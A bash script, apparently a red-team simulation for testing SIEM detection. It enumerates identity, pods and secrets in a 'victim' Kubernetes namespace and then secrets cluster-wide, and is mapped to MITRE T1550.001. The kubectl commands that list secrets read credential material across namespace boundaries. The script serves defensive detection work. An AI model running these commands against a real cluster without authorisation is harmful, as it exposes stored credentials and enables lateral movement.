#!/bin/bash
# ============================================================================
# Attack Simulation: Cross-Namespace Lateral Movement
# MITRE ATT&CK: T1550.001 - Application Access Token
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh
# ============================================================================
#
# TACTIC: Lateral Movement (TA0008). After landing in one namespace ("attacker"), the
# adversary uses the identity/token they already hold to reach INTO other namespaces
# ("victim") and across the whole cluster — probing what their stolen credential can
# actually touch. Namespaces are a soft boundary, not a hard one, if RBAC is loose.
#
# THIS IS AN INTENTIONAL ATTACK SIMULATION for detection testing — it is deliberately
# probing across trust boundaries so the SIEM has something to alert on.
#
# WHAT A DEFENDER SHOULD SEE: in AKSAudit, one identity from the "attacker" namespace
# reading pods/secrets in the "victim" namespace and cluster-wide — a token being used
# outside its home namespace.

# Step 1 — reconnaissance of self: who am I? `kubectl auth whoami` prints the current
# subject; if that verb isn't available, fall back to listing service accounts in the
# attacker namespace. `2>/dev/null || ...` makes the fallback kick in on any error.
echo "[*] Current identity..."
kubectl auth whoami 2>/dev/null || kubectl get sa -n attacker

echo ""
# Step 2 — reach into the OTHER namespace. Listing pods maps the target; listing its
# secrets is the real prize (credentials). Success here means RBAC isn't isolating
# namespaces from the attacker's identity.
echo "[*] Attempting to list resources in victim namespace..."
kubectl get pods -n victim
kubectl get secrets -n victim

echo ""
# Step 3 — widen to the whole cluster. `--all-namespaces` tests whether the stolen
# identity has cluster-scoped read on secrets (blast-radius maximization).
echo "[*] Attempting to list secrets across all namespaces..."
kubectl get secrets --all-namespaces

echo ""
# Operator-facing summary of what should have been generated in the audit logs.
echo "[*] Lateral movement attempt complete."
echo "[*] Expected Sentinel detection: AKSAudit cross-namespace token use"
echo "[*] Expected MITRE technique: T1550.001"
